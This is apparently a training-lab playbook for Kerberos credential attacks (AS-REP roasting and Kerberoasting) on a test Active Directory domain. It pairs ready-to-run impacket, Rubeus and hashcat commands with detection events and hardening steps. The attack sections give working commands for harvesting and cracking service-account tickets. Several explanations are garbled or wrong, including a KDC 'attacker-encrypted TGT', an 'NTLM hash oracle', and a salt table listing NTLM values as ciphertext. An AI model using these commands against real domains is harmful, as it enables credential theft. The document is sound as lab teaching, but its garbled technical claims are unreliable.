# Playbook 02 — Kerberos Attacks: AS-REP Roasting & Kerberoasting (RC4 vs AES)

> **Stage:** Credential Access (MITRE T1558.004, T1558.003)
> **Toolset:** Rubeus, impacket `GetNPUsers` / `GetUserSPNs`, `tools/py_kerberoast.py`, `hashcat`
> **Cosmology:** Every ticket is encrypted with a *user's own* password-derived key —
> that's the whole trick.

---

## 1. Theory — why Kerberos leaks hashes

Forget the acronym soup. Kerberos has three parties: the **client** (us), the
**KDC** (`dc01`) and the **service** running *as the account being targeted*.

1. **AS-REQ** – client asks the KDC for a TGT. The reply (TGT) is encrypted with
   the **requested principal's** long-term key (`krbtgt`).
2. **TGS-REQ** – client shows the TGT and asks for a service ticket for the SPN
   (e.g. `MSSQLSvc/sql01.corp.local:1433`). The service ticket is encrypted with
   **the service account's long-term key** (`svc-sql`'s NTLM hash).
3. **The callback** — the client can *keep the encrypted service ticket*.

An attacker who captures that encrypted service ticket can **brute-force the
service account's password offline**. Same for AS-REP: if an account has
`DONT_REQUIRE_PREAUTH` set, the KDC sends an AS-REP encrypted with the *user's*
key even before any password proofing — capture it, crack it.

**RC4 vs AES matters for the lab:** RC4 tickets are encrypted with a pure NTLM
hash (`NT Hash`), AES tickets with a key derived PBKDF2-ish from the same
password. RC4 (etype **0x17**, hashcat mode **13100**) is trivially crackable
because the NTLM hash is a single MD4 round.

## 2. Preconditions in the lab

```powershell
# injected by inject_misconfigs.ps1:
Get-ADUser svc-sql -Properties servicePrincipalName | select -ExpandProperty servicePrincipalName
Get-ADUser asrep-user -Properties userAccountControl | Select userAccountControl
# -> expect "asrep-user" with 0x400000 set (DONT_REQUIRE_PREAUTH)
```

## 3. AS-REP Roasting (T1558.004) — the canary account

```bash
# From UBUNTU-SEC — harvest without any auth:
python3 GetNPUsers.py corp.local/'asrep-user' -no-pass -dc-ip 192.168.56.10

# Rubeus on WS01:
Rubeus.exe asreproast /user:asrep-user /format:hashcat /outfile:asrep.txt
```

### Why
`-no-pass` works because the KDC happily returns an attacker-encrypted TGT for a
pre-auth-less account. You get a `$krb5asrep$23$*...` blob = NTLM hash oracle.

### Crack
```bash
hashcat -m 18200 asrep.txt wordlists/rockyou.txt
john --format=krb5asrep asrep.txt
```

### Defensive artifact
The success path produces **Event 4768** (AS-REQ) with
`PreAuthType=0` for `asrep-user` — a Configuration-Review-grade finding, plus a
password-reset action on the canary.

## 4. Kerberoasting (T1558.003)

### 4.1 Via impacket (the reference implementation)

```bash
python3 GetUserSPNs.py -request -dc-ip 192.168.56.10 -outputfile krb_rc4.txt CORP/t2-user:'LabStart!22445'
```

`-request` sends a TGS-REQ for **every** discovered SPN and dumps the encrypted
service tickets. impacket requests **RC4 by default** — that choice is exactly
the Event 4769 anomaly your SOC must catch (see `sigma_rules.yaml`).

### 4.2 Via Rubeus (Windows-native, all ciphers)

```powershell
Rubeus.exe kerberoast /stats                # cipher distribution ("RC4 seen")
Rubeus.exe kerberoast /outfile:hashes.txt   # full DC roast
Rubeus.exe kerberoast /user:svc-sql /rc4    # force RC4 for a Tier-1 target
```

### 4.3 Via the repo's pure-Python tool

```bash
python -m tools.py_kerberoast discover --server 192.168.56.10 \
  --user 'CORP\t2-user' --password 'LabStart!22445' --tier 1

python -m tools.py_kerberoast roast --user 'CORP\t2-user' \
  --password 'LabStart!22445' --domain corp.local --kdc 192.168.56.10 \
  --discover 192.168.56.10 --rc4 --out krb_rc4.txt
```

Under the hood: `KdcRequestor` (impacket) does the TGS-REQ; our
`Krb5TgsMaterial.to_hash()` composes the `$krb5tgs$23$*user$CORP.LOCAL$spn*$...` line.
For RC4 the 16-byte checksum is the **last** 16 bytes; for AES it is the **first** —
`split_checksum()` handles both (unit-tested).

## 5. Cracking & analyzing the roast

```bash
hashcat -m 13100 krb_rc4.txt rockyou.txt    # RC4 tickets
hashcat -m 19700 krb_rc4.txt rockyou.txt    # AES-256 tickets (mode 19600 = AES-128)
```

Compare: an RC4 (mode 13100) ticket cracks with GPU-friendliness that the AES
modes simply cannot match — 2x–10x faster per candidate. **That speed gap is why
RC4 is the kingdom-era default and why your detection stack should flag it.**

## 6. Detection Engineering — the RC4 giveaway

Whether you roast from Rubeus or `py_kerberoast --rc4`, the domain records:

| Event | Field you burned into | Meaning |
|-------|--------------------|---------|
| **4769** | `TicketEncryptionType=0x17` | RC4 chosen for a TGS — matches Sigma `5b3a0c2a` |
| **4769** | `AccountName`, `ClientAddress` | which SPN + source host |
| **4769** | `ServiceName=krbtgt` anomaly | tried-to-forge tickets |

The lab's Sigma rule triages:
- `ServiceName=krbtgt` + RC4 + non-DC source → **Golden Ticket suspicion** (playbook 05)
- sporadic RC4 from `svc-sql` query host → **Kerberoasting in progress**

### Why RC4 is a "you were here" artifact
Modern domains negotiate **AES** for normal service use. The instant a request
asks the KDC for an **RC4** service ticket, the client is announcing "I want a
pre-2012-cipher token" — the KDC helpfully signs that request with the client's
auth, giving the SOC a source IP to chase.

## 7. Cracking the Roast — where the lab gives back

| Roast target | Salt (crack input) | Ciphertext content | Password (lab default) |
|--------------|--------------------|--------------------|------------------------|
| `svc-sql` | `CORP.LOCAL` + SPN | NTLM of `LabStart!22445` (lab-injected weak) | `LabStart!22445` |
| `asrep-user` | `CORP.LOCAL` + user | NTLM of weak service default | `LabStart!22445` |

Once you have `svc-sql`'s plaintext, **playbook 03's relay**, **playbook 05's
DCSync** and the ACL-abuse stages become legal lab activities from a verified
credential.

---

## Hardening (do these AFTER you've confirmed the detections fire)

1. Convert SPN accounts to **gMSA** (`New-ADServiceAccount`, recipe in
   `detections/mitigation_matrix.md`) — password no longer human-derivable.
2. Disable RC4 domain-wide: GPO *Computer → Policies → Windows Settings →
   Security Settings → Local Policies → Security Options → "Network security:
   Kerberos permitted encryption types"* — untick RC4_HMAC_MD5.
3. Audit `userAccountControl` for `0x400000` and clear it.
4. Re-run `py_kerberoast --rc4`: the hash corpus must go **empty**; the only
   remaining 4769s are your *expected* checker traffic.